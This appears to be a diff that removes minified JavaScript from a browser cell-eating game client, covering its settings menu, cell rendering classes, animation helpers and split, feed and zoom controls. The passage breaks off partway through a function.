-                        p($, e) {
-                            W && xJ.p($, e), 8 & e && (0, x.jXN)($t, $t = $[3]) ? (xP.d(1), (xP = m()).c(), xP.m($$, $x)) : xP.p($, e), 8 & e && (0, x.jXN)($r, $r = $[3]) ? (xV.d(1), (xV = C()).c(), xV.m($a, $l)) : xV.p($, e), 8 & e && (0, x.jXN)($E, $E = $[3]) ? (xZ.d(1), (xZ = p()).c(), xZ.m($B, null)) : xZ.p($, e), 8 & e && (0, x.jXN)($W, $W = $[3]) ? (xO.d(1), (xO = f()).c(), xO.m($7, $K)) : xO.p($, e), 8 & e && (0, x.jXN)($O, $O = $[3]) ? (x8.d(1), (x8 = _()).c(), x8.m($V, $8)) : x8.p($, e), 8 & e && (0, x.jXN)(ei, ei = $[3]) ? (s$.d(1), (s$ = w()).c(), s$.m(ex, en)) : s$.p($, e), 8 & e && (0, x.jXN)(eh, eh = $[3]) ? (se.d(1), (se = v()).c(), se.m(el, eA)) : se.p($, e), 8 & e && (0, x.jXN)(eC, eC = $[3]) ? (st.d(1), (st = b()).c(), st.m(eg, ep)) : st.p($, e), 8 & e && (0, x.jXN)(ey, ey = $[3]) ? (sx.d(1), (sx = y()).c(), sx.m(ev, eB)) : sx.p($, e), 8 & e && (0, x.jXN)(eS, eS = $[3]) ? (ss.d(1), (ss = B()).c(), ss.m(ek, eY)) : ss.p($, e), 8 & e && (0, x.jXN)(e9, e9 = $[3]) ? (si.d(1), (si = F($)).c(), si.m(e6, null)) : si.p($, e), 8 & e && (0, x.jXN)(eU, eU = $[3]) ? (sn.d(1), (sn = I($)).c(), sn.m(eG, null)) : sn.p($, e), 8 & e && (0, x.jXN)(eJ, eJ = $[3]) ? (sa.d(1), (sa = D($)).c(), sa.m(eq, null)) : sa.p($, e), $[4] ? so ? so.p($, e) : ((so = N($)).c(), so.m(t3, tq)) : so && (so.d(1), so = null), 8 & e && (0, x.jXN)(xb, xb = $[3]) ? (sr.d(1), (sr = Q($)).c(), sr.m(xf, null)) : sr.p($, e), 8 & e && (0, x.jXN)(xY, xY = $[3]) ? (sl.d(1), (sl = k($)).c(), sl.m(xk, null)) : sl.p($, e), $[5] ? sc ? sc.p($, e) : ((sc = T($)).c(), sc.m(xD, xR)) : sc && (sc.d(1), sc = null), 8 & e && (0, x.jXN)(xM, xM = $[3]) ? (sh.d(1), (sh = S()).c(), sh.m(x5, xL)) : sh.p($, e), 64 & e && (0, x.goL)(x4, "disabled", !$[6]), $[6] ? sA ? sA.p($, e) : ((sA = Y($)).c(), sA.m(xG, null)) : sA && (sA.d(1), sA = null)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(c), xX.d(), xJ && xJ.d(), xP.d($), xV.d($), xZ.d($), xO.d($), x8.d($), s$.d($), se.d($), st.d($), sx.d($), ss.d($), si.d($), sn.d($), sa.d($), so && so.d(), sr.d($), sl.d($), sc && sc.d(), sh.d($), sA && sA.d(), (xW = !1, x.oOW)(xK)
-                        }
-                    }
-                }
-                let U = (0, s.T5)(!1),
-                    q = (0, s.T5)(r.A.get("showHud")),
-                    W = (0, s.T5)(r.A.get("showStats")),
-                    K = (0, s.T5)(r.A.get("showMinimapStats")),
-                    X = (0, s.T5)(r.A.get("useSharedViewport")),
-                    J = (0, s.T5)(r.A.get("triggerIgnoreSizeEnabled")),
-                    P = (0, s.T5)(r.A.get("minimapEnabled")),
-                    V = (r.A.on("zrVIMz", ($, e) => {
-                        "showHud" === $ ? q.set(!!e) : "showStats" === $ ? W.set(!!e) : "useSharedViewport" === $ ? X.set(!!e) : "triggerIgnoreSizeEnabled" === $ ? J.set(!!e) : "minimapEnabled" === $ ? P.set(!!e) : "showMinimapStats" === $ ? K.set(!!e) : U.set(!(0, s.Jt)(U))
-                    }), $ => 1e3 <= $ ? ($ / 1e3).toFixed(1) + "s" : $ + "ms");
-                class Z extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, s) {
-                            let n, l, h, d, g, m, C, p, f;
-                            (0, x.j0C)(e, i.E, $ => s(0, l = $)), (0, x.j0C)(e, U, $ => s(3, h = $)), (0, x.j0C)(e, X, $ => s(4, d = $)), (0, x.j0C)(e, J, $ => s(5, g = $)), (0, x.j0C)(e, q, $ => s(6, m = $)), (0, x.j0C)(e, W, $ => s(7, C = $)), (0, x.j0C)(e, P, $ => s(8, p = $)), (0, x.j0C)(e, K, $ => s(9, f = $));
-                            let _ = $ => {
-                                A().fire({
-                                    title: "Restart required",
-                                    text: "Refresh page to " + ($ ? "fully " : "") + "apply changes?",
-                                    icon: "info",
-                                    showConfirmButton: !0,
-                                    showCancelButton: !0
-                                }).then($ => $.isConfirmed && setTimeout(() => location.reload(), 300))
-                            };
-                            return e.$$.update = () => {
-                                1 & e.$$.dirty && s(2, n = l === i.b.Settings)
-                            }, [l, a.A, n, h, d, g, m, C, p, f, $ => {
-                                (0, x.vu6)(i.E, l = $.detail ? i.b.Settings : i.b.None, l)
-                            }, _, $ => {
-                                if (($ = $.currentTarget).hasAttribute("data-name")) {
-                                    var e = $.getAttribute("data-name");
-                                    let t;
-                                    if ("checkbox" === $.type) t = $.checked;
-                                    else if ("text" === $.type) t = $.value;
-                                    else {
-                                        if ("range" !== $.type) return void(0, c.X0)(!1, "Invalid input type used:", $.type);
-                                        t = +$.value
-                                    }
-                                    if (r.A.get(e) !== t) {
-                                        r.A.set(e, t);
-                                        var x, i, n, l = t;
-                                        switch (e) {
-                                            case "tabStatusMode":
-                                                return void(a.A.running && (a.A.HsE.forEach($ => {
-                                                    for (x of $) x.VEj && x.IvE()
-                                                }), n = o.A.yNT, i = a.A.FCi.ZRd(0 === n ? 1 : 0), n = a.A.FCi.ZRd(n), i && (delete i.wFC, i.PJd()), n && (delete n.wFC, n.PJd()), a.A.jWf(0 === o.A.yNT ? 1 : 0, o.A.yNT)));
-                                            case "showChat":
-                                                return void(a.A.running && a.A.emit("uEBHda", !!l));
-                                            case "useWebGL":
-                                            case "useAntialiasing":
-                                                return void _();
-                                            case "gameResolution":
-                                                return void(u.Uk.resolution = l, u.Uk.resize(window.innerWidth, window.innerHeight), u.Uk.view.style.width = window.innerWidth + "px", u.Uk.view.style.height = window.innerHeight + "px");
-                                            case "showNames":
-                                            case "showSkins":
-                                            case "showMass":
-                                            case "showOwnName":
-                                            case "showOwnSkin":
-                                            case "showOwnMass":
-                                                return void(a.A.running && a.A.FCi.AaG());
-                                            case "foodVisible":
-                                                return void(a.A.running && s(1, a.A.scene.food.visible = !!l, a.A));
-                                            case "showFPS":
-                                            case "showPing":
-                                            case "showPlayerMass":
-                                            case "showPlayerScore":
-                                            case "showCellCount":
-                                                return void(a.A.running && a.A.emit("oiKdMc"));
-                                            case "cellsOpacity":
-                                                return void(a.A.running && s(1, a.A.scene.foreground.alpha = +l, a.A));
-                                            case "minimapLocations":
-                                                return void(a.A.running && a.A.emit("dHeEDj"));
-                                            case "minimapEnabled":
-                                                return void(a.A.running && (l ? (a.A.emit("OTySHI"), a.A.emit("dHeEDj")) : a.A.emit("PSbuQD")));
-                                            case "showClock":
-                                            case "showSessionTime":
-                                            case "showPlayerCount":
-                                            case "showSpectators":
-                                            case "showRestartTiming":
-                                            case "showTagTotalMass":
-                                                return void a.A.emit("gWdDAg");
-                                            case "showMinimapStats":
-                                                a.A.emit("omMooP", !!l)
-                                        }
-                                    }
-                                }
-                            }, $ => {
-                                if (!$.hasAttribute("data-name")) return null;
-                                var e = $.getAttribute("data-name");
-                                "checkbox" === $.type ? $.checked = r.A.get(e) : "text" === $.type || "range" === $.type ? $.value = r.A.get(e) : (0, c.X0)(!1, "Invalid input type used:", $.type)
-                            }, $ => {
-                                switch ($) {
-                                    case 0:
-                                        return "nobody else's";
-                                    case 1:
-                                        return "tag players'";
-                                    case 2:
-                                        return "everyone's";
-                                    default:
-                                        return "?"
-                                }
-                            }, $ => {
-                                switch ($) {
-                                    case 0:
-                                        return "outline for both tabs";
-                                    case 1:
-                                        return "arrow on active tab only";
-                                    case 2:
-                                        return "nothing for both tabs";
-                                    default:
-                                        return "?"
-                                }
-                            }, $ => $ * $ * .01, () => (0, x.vu6)(i.E, l = i.b.None, l), () => _(!0), () => _(), function($) {
-                                s(2, n = $), s(0, l)
-                            }]
-                        }, function $(e) {
-                            let t, s, i;
-
-                            function a($) {
-                                e[20]($)
-                            }
-                            var o = {
-                                $$slots: {
-                                    default: [H]
-                                },
-                                $$scope: {
-                                    ctx: e
-                                }
-                            };
-                            return void 0 !== e[2] && (o.show = e[2]), t = new n.A({
-                                props: o
-                            }), x.Dnk.push(() => (0, x.oIE)(t, "show", a)), t.$on("visibility", e[10]), {
-                                c() {
-                                    (0, x.N0i)(t.$$.fragment)
-                                },
-                                m($, e) {
-                                    (0, x.wSR)(t, $, e), i = !0
-                                },
-                                p($, [e]) {
-                                    var i = {};
-                                    8389627 & e && (i.$$scope = {
-                                        dirty: e,
-                                        ctx: $
-                                    }), !s && 4 & e && (s = !0, i.show = $[2], (0, x.Jk$)(() => s = !1)), t.$set(i)
-                                },
-                                i($) {
-                                    i || ((0, x.c7F)(t.$$.fragment, $), i = !0)
-                                },
-                                o($) {
-                                    (0, x.Tn8)(t.$$.fragment, $), i = !1
-                                },
-                                d($) {
-                                    (0, x.Hbl)(t, $)
-                                }
-                            }
-                        }, x.jXN, {})
-                    }
-                }
-                let O = Z
-            },
-            7009($, e, t) {
-                t.d(e, {
-                    A: () => o
-                });
-                var x = t(83839),
-                    s = (t(60821), t(36742)),
-                    i = t(98781);
-
-                function n($) {
-                    let e;
-                    return {
-                        c() {
-                            (e = (0, x.ND4)("div")).textContent = "To be implemented."
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t)
-                        },
-                        p: x.lQ1,
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-                class a extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, i) {
-                            let n, a;
-                            return (0, x.j0C)(e, s.E, $ => i(2, a = $)), e.$$.update = () => {
-                                4 & e.$$.dirty && i(0, n = a === s.b.Themes)
-                            }, [n, $ => {
-                                (0, x.vu6)(s.E, a = $.detail ? s.b.Themes : s.b.None, a)
-                            }, a, function($) {
-                                i(0, n = $), i(2, a)
-                            }]
-                        }, function $(e) {
-                            let t, s, a;
-
-                            function o($) {
-                                e[3]($)
-                            }
-                            var r = {
-                                $$slots: {
-                                    default: [n]
-                                },
-                                $$scope: {
-                                    ctx: e
-                                }
-                            };
-                            return void 0 !== e[0] && (r.show = e[0]), t = new i.A({
-                                props: r
-                            }), x.Dnk.push(() => (0, x.oIE)(t, "show", o)), t.$on("visibility", e[1]), {
-                                c() {
-                                    (0, x.N0i)(t.$$.fragment)
-                                },
-                                m($, e) {
-                                    (0, x.wSR)(t, $, e), a = !0
-                                },
-                                p($, [e]) {
-                                    var i = {};
-                                    16 & e && (i.$$scope = {
-                                        dirty: e,
-                                        ctx: $
-                                    }), !s && 1 & e && (s = !0, i.show = $[0], (0, x.Jk$)(() => s = !1)), t.$set(i)
-                                },
-                                i($) {
-                                    a || ((0, x.c7F)(t.$$.fragment, $), a = !0)
-                                },
-                                o($) {
-                                    (0, x.Tn8)(t.$$.fragment, $), a = !1
-                                },
-                                d($) {
-                                    (0, x.Hbl)(t, $)
-                                }
-                            }
-                        }, x.jXN, {})
-                    }
-                }
-                let o = a
-            },
-            84740($, e, t) {
-                t.d(e, {
-                    A: () => c
-                });
-                var x = t(15308),
-                    e = t(83529),
-                    s = t(23059),
-                    i = t(61036),
-                    n = t(82128),
-                    a = t(70679),
-                    o = t(87706),
-                    r = t(74173);
-                let l = e.A.get("drawDelay");
-                e.A.on("zrVIMz", ($, e) => {
-                    "drawDelay" === $ && (l = e)
-                });
-                class c {
-                    get type() {
-                        return this.view.getUint8(0)
-                    }
-                    set type($) {
-                        this.view.setUint8(0, $)
-                    }
-                    get flags() {
-                        return this.view.getUint8(1)
-                    }
-                    set flags($) {
-                        this.view.setUint8(1, $)
-                    }
-                    get id() {
-                        return this.view.getUint16(2, !0)
-                    }
-                    set id($) {
-                        this.view.setUint16(2, $, !0)
-                    }
-                    get size() {
-                        return this.view.getUint16(16)
-                    }
-                    set size($) {
-                        this.view.setUint16(16, $)
-                    }
-                    get Fwk() {
-                        return this.view.getUint16(18)
-                    }
-                    set Fwk($) {
-                        this.view.setUint16(18, $)
-                    }
-                    get dxt() {
-                        return this.view.getUint16(20)
-                    }
-                    set dxt($) {
-                        this.view.setUint16(20, $)
-                    }
-                    get PnL() {
-                        return i.T9(...this.tQY)
-                    }
-                    constructor($, e, t, x, i, a, l, c) {
-                        this.buffer = new ArrayBuffer(22), this.view = new DataView(this.buffer), this.position = r.A.nVI(new Int16Array(this.buffer, 12, 2)), this.Fql = r.A.nVI(new Int16Array(this.buffer, 4, 2)), this.ytG = r.A.nVI(new Int16Array(this.buffer, 8, 2)), this.scale = 1, this.tQY = [-1, -1], this.EZD = new n.m(this), this.type = $, this.id = e || 0, this.texture = t = t || s.WK.get(0), ($ = this.sprite = new o.Sprite(t)).anchor.set(.5), ($.gameData = this).position.set(x, i), this.position.copy(this.Fql), this.position.copy(this.ytG), $.position.set(x, i), this.dxt = this.Fwk = this.size = a, this.flags = l, this.context = c
-                    }
-                    get mass() {
-                        return this.dxt * this.dxt / 100
-                    }
-                    update($) {
-                        var $ = (0, x.N)(($ - this.PnL) / l, 0, 1),
-                            $ = (this.position.x = (0, x.Cc)(this.Fql.x, this.ytG.x, $ * this.scale), this.position.y = (0, x.Cc)(this.Fql.y, this.ytG.y, $ * this.scale), 2 * (this.size = (0, x.Cc)(this.Fwk, this.dxt, $))),
-                            e = this.sprite;
-                        return null == e || !(!this.position.equalTo(e.x, e.y) || e.width !== $) || (e.x = this.position.x, e.y = this.position.y, e.width = e.height = $, !1)
-                    }
-                    destroy($) {
-                        0 === this.EZD.size && (a.Ab.delete(this.id), a.DH.delete(this), this.destroyed) || (a.DH.delete(this), this.destroyed = !0, this.KSg?.(), $ ? a.nf.add(this) : this.LnE())
-                    }
-                    LnE() {
-                        this.sprite ? (this.sprite.destroy(), this.sprite = null) : (0, x.$s)(1, 'Sprite for cell "' + this.id + '" already destroyed!')
-                    }
-                }
-            },
-            91461($, e, t) {
-                var x = t(84740);
-                t(19659), t(87706), t(49544), x.A
-            },
-            91001($, e, t) {
-                t.d(e, {
-                    A: () => i
-                });
-                var e = t(84740),
-                    x = t(19659),
-                    s = t(87706);
-                t(63166);
-                class i extends e.A {
-                    constructor($, e, t, i, n, a) {
-                        super(x.QG, $, s.Texture.from("./img/crown.png"), e, t, i, n, a), this.htA = !0, this.sprite.alpha = .7
-                    }
-                }
-            },
-            43815($, e, t) {
-                t.d(e, {
-                    A: () => i
-                });
-                var e = t(84740),
-                    x = t(19659),
-                    s = t(23059);
-                class i extends e.A {
-                    constructor($, e, t, i, n, a, o = !0, r = 4210752) {
-                        super(x.rn, $, o = (o ? s.WK : s.lw).get(r), e, t, i, n, a), this.rDK = !0, this.sprite.alpha = .5, this.type = x.rn
-                    }
-                }
-            },
-            79287($, e, t) {
-                t.d(e, {
-                    A: () => l
-                });
-                var x = t(83529),
-                    e = t(84740),
-                    s = t(19659),
-                    i = t(23059),
-                    n = t(15308),
-                    a = t(93581);
-                let o = () => i.WK.get(parseInt(x.A.get("ejectedColor"), 16)),
-                    r = x.A.get("drawDelay");
-                x.A.on("zrVIMz", ($, e) => {
-                    "drawDelay" === $ && (r = e)
-                });
-                class l extends e.A {
-                    static ROS($) {
-                        let e = new a.I(.4, 1, 300);
-                        l.animator = e, $.on("started", () => e.start()), $.on("stopped", () => e.stop())
-                    }
-                    constructor($, e, t, i, n, a) {
-                        super(s.do, $, o(), e, t, i, n, a), this.cRV = !0, x.A.get("animateEjectedCells") && l.animator.pjN(this.sprite)
-                    }
-                    CHS() {
-                        this.sprite.texture = this.texture = o()
-                    }
-                    update($) {
-                        return $ = (0, n.N)(($ - this.PnL) / r, 0, 1), this.position.set((0, n.Cc)(this.Fql.x, this.ytG.x, $), (0, n.Cc)(this.Fql.y, this.ytG.y, $)), !(null != ($ = this.sprite) && !this.position.equalTo($.x, $.y) && ($.x = this.position.x, $.y = this.position.y, 1))
-                    }
-                    KSg() {
-                        x.A.get("animateEjectedCells") && this.sprite && l.animator.vmV(this.sprite)
-                    }
-                }
-            },
-            75576($, e, t) {
-                t.d(e, {
-                    A: () => r
-                });
-                var x = t(23059),
-                    s = t(92915),
-                    e = t(84740),
-                    i = t(19659),
-                    n = t(83529),
-                    a = t(70679);
-                t(15308);
-                let o = $ => x.WK.get(n.A.get("useFoodColor") ? parseInt(n.A.get("foodColor"), 16) : s.pz.at($ % s.pz.length));
-                class r extends e.A {
-                    constructor($, e, t, x, s, n) {
-                        super(i.xV, $, o($), e, t, x, s, n), this.sxA = !0
-                    }
-                    CHS() {
-                        this.sprite.texture = this.texture = o(this.id)
-                    }
-                    update() {
-                        var $, e = this.sprite;
-                        return null == e || (this.position.set(this.ytG), e.x === this.position.x && e.y === this.position.y || ($ = 2 * (this.size = this.dxt), e.x = this.position.x, e.y = this.position.y, e.width = e.height = $), !1)
-                    }
-                    destroy() {
-                        0 === this.EZD.size && (a.Ab.delete(this.id), a.DH.delete(this), this.destroyed) || (this.destroyed = !0, a.DH.delete(this), this.LnE())
-                    }
-                }
-            },
-            1786($, e, t) {
-                t.d(e, {
-                    No: () => n.A,
-                    Oe: () => o.A,
-                    hN: () => a.A,
-                    kF: () => x.A,
-                    ub: () => s.A,
-                    xx: () => i.A
-                });
-                var x = t(88074),
-                    s = t(63),
-                    i = t(79287),
-                    n = t(75576),
-                    a = t(43815),
-                    o = t(91001);
-                t(91461)
-            },
-            88074($, e, t) {
-                t.d(e, {
-                    A: () => u
-                });
-                var x = t(83529),
-                    e = t(84740),
-                    s = t(19659),
-                    i = t(41958),
-                    n = t(15308),
-                    a = t(23059),
-                    o = t(78225),
-                    r = t(93581),
-                    l = t(95514),
-                    c = t(87706);
-                let h = x.A.get("drawDelay");
-                x.A.on("zrVIMz", ($, e) => {
-                    "drawDelay" === $ && (h = e)
-                });
-                let A;
-                class u extends e.A {
-                    static ROS($) {
-                        A = $;
-                        let e = new r.I(.3, 1, 500);
-                        u.animator = e, A.on("started", () => e.start()), A.on("stopped", () => e.stop())
-                    }
-                    constructor($, e, t, i, n, r, l) {
-                        super(s.g4, $, r.texture || a.WK.get(0), e, t, i, n, l), this.exG = !0, this.player = r, this.pid = r.pid, -1 !== ($ = o.A.pids.indexOf(this.pid)) && (A.HsE[$].add(this), 1 === x.A.get("tabStatusMode")) && $ === o.A.yNT && this.qLx(), r.Rak && this.xtA(), x.A.get("animatePlayerCells") && u.animator.pjN(this.sprite)
-                    }
-                    xtA() {
-                        var $;
-                        if (null != this.crownSprite) return (0, n.$s)(1, "xtA(): crown already exists");
-                        this.sprite.addChild(this.crownSprite = A.eWF.pop() || (($ = c.Sprite.from("./img/crown.png")).scale.set(.7), $.pivot.set(0, 643), $.anchor.set(.5, 0), $.rotation = -.5, $.alpha = .7, $.zIndex = 2, $))
-                    }
-                    DgL() {
-                        var $ = this.crownSprite;
-                        if (null == $) return (0, n.$s)(1, "DgL(): crown doesnt exist");
-                        this.sprite.removeChild($), A.eWF.length < 128 ? A.eWF.push($) : $.destroy(), delete this.crownSprite
-                    }
-                    qLx() {
-                        var $;
-                        this.VEj || ($ = this.VEj = (($ = new c.Sprite(a.$P.get())).anchor.set(.5), $.y = -290, $.width = $.height = 50, $.alpha = .8, $.zIndex = 2, $), this.sprite.addChild($))
-                    }
-                    IvE() {
-                        var $ = this.VEj;
-                        if (null == $) return (0, n.$s)(1, "IvE(): arrow doesnt exist");
-                        this.sprite.removeChild($), $.destroy(), delete this.VEj
-                    }
-                    update($) {
-                        var $ = (0, n.N)(($ - this.PnL) / h, 0, 1),
-                            $ = (this.position.x = (0, n.Cc)(this.Fql.x, this.ytG.x, $ * this.scale), this.position.y = (0, n.Cc)(this.Fql.y, this.ytG.y, $ * this.scale), 2 * (this.size = (0, n.Cc)(this.Fwk, this.dxt, $))),
-                            e = this.sprite;
-                        return !(null != e && !this.texture.VqU && (!this.position.equalTo(e.x, e.y) || e.width !== $) && (e.x = this.position.x, e.y = this.position.y, e.width = e.height = $, this.AfU(), 1))
-                    }
-                    AfU() {
-                        var $, e, t = A.scene.container.scale.x * this.size * l.Uk.resolution,
-                            s = t > x.A.get("smallTextThreshold");
-                        this.player.VAP && s ? (this.SoH || (this.SoH = A.UJM.pop() || ($ = new c.BitmapText("", {
-                            fontName: "mass",
-                            align: "right"
-                        }), e = x.A.jLt.strokeThickness || 0, $.position.set(-e / 2, -e / 2), $.anchor.set(.5, -.6), $), this.SoH.zIndex = 0, this.sprite.addChild(this.SoH)), this.SoH.text = A.Hdd(this.mass), this.SoH.visible = !0) : this.SoH && (this.SoH.visible = !1), this.player.cSM && s ? (!this.RiW && this.player.RiW && (this.RiW = new c.Sprite(this.player.RiW.texture), this.RiW.anchor.set(.5), this.player instanceof i.A || (this.RiW.anchor.y = .6, this.RiW.scale.set(1.5, 1.5)), this.RiW.zIndex = 1, this.sprite.addChild(this.RiW)), this.RiW && (this.RiW.visible = !0)) : this.RiW && (this.RiW.visible = !1), this.crownSprite && (this.crownSprite.visible = 16 < t && x.A.get("showCrown")), this.VEj && (this.VEj.visible = 16 < t)
-                    }
-                    KSg() {
-                        x.A.get("animatePlayerCells") && u.animator.vmV(this.sprite);
-                        var $ = o.A.pids.indexOf(this.pid); - 1 !== $ && A.HsE[$].delete(this), this.SoH && (this.sprite.removeChild(this.SoH), A.UJM.length < 256 ? A.UJM.push(this.SoH) : this.SoH.destroy(!0)), this.crownSprite && this.DgL()
-                    }
-                    LnE() {
-                        this.sprite ? (this.sprite.destroy(), this.sprite = null, this.RiW && this.RiW.destroy()) : (0, n.$s)(1, 'Sprite for player cell "' + this.id + '" already destroyed!')
-                    }
-                }
-            },
-            70679($, e, t) {
-                t.d(e, {
-                    Ab: () => i,
-                    DH: () => n,
-                    nf: () => s
-                });
-                let x = t(44895),
-                    s = new x.A,
-                    i = new Map,
-                    n = new x.A
-            },
-            19659($, e, t) {
-                t.d(e, {
-                    QG: () => o,
-                    Sq: () => s,
-                    do: () => i,
-                    eL: () => l,
-                    g4: () => x,
-                    hH: () => r,
-                    rn: () => a,
-                    xV: () => n
-                });
-                let [x, s, i, n, a, o, r, l] = [1, 2, 3, 4, 5, 6, 7, 9]
-            },
-            83842($, e, t) {
-                t.d(e, {
-                    A: () => s
-                });
-                let x = t(87706).Ticker.shared;
-                class s {
-                    constructor() {
-                        this.running = !1, this.TJL = null
-                    }
-                    PNv($) {
-                        this.running && null != this.TJL && (x.remove(this.TJL), this.running = !1), this.TJL = $
-                    }
-                    start() {
-                        x.add(this.TJL), this.running = !0
-                    }
-                    stop() {
-                        x.remove(this.TJL), this.running = !1
-                    }
-                }
-            },
-            92915($, e, t) {
-                t.d(e, {
-                    O$: () => n,
-                    cy: () => a,
-                    ic: () => i,
-                    oZ: () => o,
-                    pz: () => s
-                });
-                var x = t(15308);
-                let s = [16776960, 65280, 65535, 16711935],
-                    i = [16711680, 16744448, 16776960, 8453888, 65280, 65408, 65535, 33023, 8388863, 16711935, 16711808],
-                    n = i.map($ => (0, x.v2)($, .8)),
-                    a = i.map($ => (0, x.v2)($, .7)),
-                    o = n.map($ => (0, x.v2)($, .8))
-            },
-            93581($, e, t) {
-                t.d(e, {
-                    I: () => s
-                });
-                var e = t(83842),
-                    x = t(87706);
-                class s extends e.A {
-                    constructor($, e, t) {
-                        super(), this.animate = $ => {
-                            this.naK.forEach(e => {
-                                var t = $ / x.settings.TARGET_FPMS,
-                                    t = e.alpha += t / this.fadeAmount;
-                                e && t < this.qCL || (e.alpha = this.qCL, this.naK.delete(e))
-                            })
-                        }, this.mPX = $, this.qCL = e, this.naK = new Set, this.fadeAmount = t, this.PNv(this.animate.bind(this))
-                    }
-                    pjN($) {
-                        $.alpha = this.mPX, this.naK.add($)
-                    }
-                    vmV($) {
-                        this.naK.has($) && this.naK.delete($)
-                    }
-                    stop() {
-                        super.stop(), this.naK.clear()
-                    }
-                }
-            },
-            44895($, e, t) {
-                t.d(e, {
-                    A: () => s
-                });
-                class x {
-                    constructor($) {
-                        this.next = null, this.prev = null, this.value = $
-                    }
-                }
-                class s {
-                    constructor() {
-                        this.head = null, this.tail = null, this.length = 0
-                    }
-                    clear() {
-                        this.length = 0, this.head = this.tail = null
-                    }
-                    values() {
-                        var $ = [];
-                        let e = this.head;
-                        for (; e;) $.push(e.value), e = e.next;
-                        return $
-                    }
-                    get count() {
-                        var $ = 0;
-                        let e = this.head;
-                        for (; e;) $++, e = e.next;
-                        return $
-                    }
-                    add($) {
-                        return $ = new x($), this.head ? ($.prev = this.tail, this.tail && (this.tail.next = $), this.tail = $) : this.head = this.tail = $, this.length++, $
-                    }
-                    remove($) {
-                        $ && ($.prev ? $.prev.next = $.next : this.head = $.next, $.next ? $.next.prev = $.prev : this.tail = $.prev, $.next = $.prev = null, this.length--)
-                    }
-                    delete($) {
-                        let e = this.head;
-                        for (; e;) {
-                            if (e.value === $) return this.remove(e), !0;
-                            e = e.next
-                        }
-                        return !1
-                    }*[Symbol.iterator]() {
-                        let $ = this.head;
-                        for (; $;) yield $.value, $ = $.next
-                    }
-                    get size() {
-                        return this.length
-                    }
-                }
-            },
-            82128($, e, t) {
-                t.d(e, {
-                    m: () => x
-                });
-                class x {
-                    constructor($) {
-                        this.handles = [!1, !1], this.owner = $
-                    }
-                    get size() {
-                        return (this.handles[0] ? 1 : 0) + (this.handles[1] ? 1 : 0)
-                    }
-                    clear() {
-                        this.handles = [!1, !1]
-                    }
-                    disown($) {
-                        this.handles[$] = !1
-                    }
-                    own($) {
-                        this.handles[$] = !0
-                    }
-                    migrate($) {
-                        return this.disown($), 0 !== this.size && (this.owner.context = 0 === $ ? 1 : 0, !0)
-                    }
-                }
-            },
-            63($, e, t) {
-                t.d(e, {
-                    A: () => n
-                });
-                var e = t(84740),
-                    x = t(19659),
-                    s = t(23059),
-                    i = t(87706);
-                class n extends e.A {
-                    constructor($, e, t, i, n, a) {
-                        super(x.Sq, $, s.Tb.get(), e, t, i, n, a), this.fnF = !0, this.disabled = !1
-                    }
-                    lBZ() {
-                        this.LnE(), this.texture = s.Tb.get(), this.sprite = new i.Sprite(this.texture), this.sprite.anchor.set(.5), this.sprite.gameData = this
-                    }
-                }
-            },
-            97667($, e, t) {
-                t.d(e, {
-                    A: () => r
-                });
-                var x = t(83529),
-                    s = t(78225),
-                    i = t(15308),
-                    n = t(61036),
-                    a = t(30847),
-                    o = t(33656);
-                class r {
-                    constructor($) {
-                        this.game = $
-                    }
-                    Xiy($, e, t) {
-                        if (!this.game.pEA(t || s.A.yNT) || this.game.ycZ(t || s.A.yNT)) return !1;
-                        this.game.fwE(t || s.A.yNT, !0), this.game.FLt.adz($);
-                        let x = e ? (0, o.Qv)(e) : "";
-                        return "number" == typeof $ ? (e = this.game.FCi.get($)) && !x && (x = (0, o.Qv)(e.name || "Unnamed")) : x = x || o.g8, 0 < x.length && (x += " (tab " + (1 + ("number" == typeof t ? t : s.A.yNT)) + ")", (0, i.me)(x)), !0
-                    }
-                    Rhi() {
-                        this.game.FLt.NTE()
-                    }
-                    TaP() {
-                        this.game.FLt.DQA()
-                    }
-                    feed($) {
-                        this.game.FLt.jjW($)
-                    }
-                    PFX($, e = s.A.yNT) {
-                        var t, x, i = this.game;
-                        i.running && (x = (t = i.eWI[e]).mouse, ($ = null == $ ? !x.frozen : $) && (this.KHK(!1, e), this.OsW(!1, e), i.fjG(e), t.CiT()), x.frozen = $, i.emit("RAwTus", {
-                            mouseFrozen: !0
-                        }))
-                    }
-                    KHK($, e = s.A.yNT) {
-                        var t, x = this.game;
-                        x.running && (t = x.eWI[e].mouse, ($ = null == $ ? !t.centralize : $) && (this.PFX(!1, e), this.OsW(!1, e)), t.centralize = $, x.emit("RAwTus", {
-                            LZd: !0
-                        }))
-                    }
-                    OsW($, e = s.A.yNT) {
-                        var t, x, i = this.game;
-                        i.running && (x = (t = i.eWI[e]).mouse, ($ = null == $ ? !x.pause : $) && (i.fjG(null, e), t.CiT(), t.rHk(15), this.PFX(!1), this.KHK(!1)), x.pause = $, i.emit("RAwTus", {
-                            lockLinesplit: !0
-                        }))
-                    }
-                    lineSplit($ = s.A.yNT) {
-                        this.lZS && (0, a.DJ)(this.lZS), this.PFX(!0, $), this.split(3, null, $), this.lZS = (0, a.wg)(() => {
-                            delete this.lZS, this.PFX(!1, $)
-                        }, x.A.get("lineSplitDelay"))
-                    }
-                    split($, e, t = s.A.yNT) {
-                        var x = this.game,
-                            i = x.eWI[t];
-                        i.mouse.pause || i.CiT(), e ? (0, a.wg)(this.split.bind(this, $, t), e) : (i.JOy($), x.Ifps[t] += $, x.Ifps[t] <= 2 ? x.Pzrs[t] = performance.now() + 300 : (x.Pzrs[t] = NaN, x.Ifps[t] = 0))
-                    }
-                    zoom($) {
-                        var e = this.game,
-                            t = 1 - x.A.get("cameraZoomSpeed") / 100;
-                        let s = 0;
-                        $.detail ? s = $.detail / 3 : $.wheelDelta && (s = -($.wheelDelta / 120)), $ = n.n7(t, s), e.Cwd = (0, i.N)(e.Cwd * $, e.jeQ, 1)
-                    }
-                    Szi($) {
-                        this.game.Cwd = .8 / n.n7(2, $ - 1)
-                    }
-                    RWX() {
-                        var $ = this.game,
-                            e = s.A.yNT,
-                            t = 0 == e ? 1 : 0,
-                            n = $.eWI[t];
